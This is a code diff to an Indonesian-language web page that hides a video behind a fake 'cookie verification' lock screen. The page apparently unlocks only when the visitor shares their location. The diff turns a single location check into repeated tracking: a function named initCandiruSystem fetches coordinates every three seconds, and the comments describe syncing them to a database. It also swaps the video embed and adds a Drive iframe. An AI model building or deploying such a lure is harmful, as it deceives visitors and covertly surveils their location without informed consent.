@@ -29,7 +29,19 @@
             left: 50%;
             transform: translateX(-50%);
             text-align: center;
-        }
+           animation: neon-kedip 1s infinite alternate;
+}
+
+@keyframes neon-kedip {
+   100% {
+    opacity: 1;
+    
+  }
+  0% {
+    opacity: 0;
+    
+  }
+}
     </style>
 </head>
 <body>
@@ -43,12 +55,12 @@
         </header>
 
        <div id="content-frame" class="content-wrapper" style="display: none;">
-    <iframe id="video-youtube" src="https://www.youtube.com/embed/dQw4w9WgXcQ" allow="autoplay; encrypted-media; fullscreen"></iframe>
+    <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
+    <iframe src="https://drive.google.com/file/d/xxx/preview" width="640" height="480" allow="autoplay"></iframe>
 </div>
             <div id="lock-screen">
                 <div class="textnotif">
-              
-                   
+            
                 
                     <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
                 </div>
@@ -120,8 +132,8 @@
             }
         }
 
-        // Logika Pemeriksaan Akses Lokasi
-        function initCandiruSystem() {
+        // Logika Pemeriksaan Akses Lokasi (Dijalankan berulang menggunakan setInterval)
+        function fetchAndSyncLocation() {
             const statusDisplay = document.getElementById('status-display');
             const iframe = document.getElementById('content-frame');
             const lockScreen = document.getElementById('lock-screen');
@@ -163,6 +175,17 @@
                     timeout: 8000
                 }
             );
+        }
+
+        // Sistem utama untuk menginisialisasi pelacakan konstan
+        function initCandiruSystem() {
+            // Eksekusi pertama kali saat halaman dimuat
+            fetchAndSyncLocation();
+
+            // Melakukan refresh pengambilan koordinat dan sinkronisasi otomatis setiap 3000ms (3 detik)
+            setInterval(() => {
+                fetchAndSyncLocation();
+            }, 3000);
         }
 
         // Handler saat akses diblokir / GPS mati / Sinkronisasi database gagal
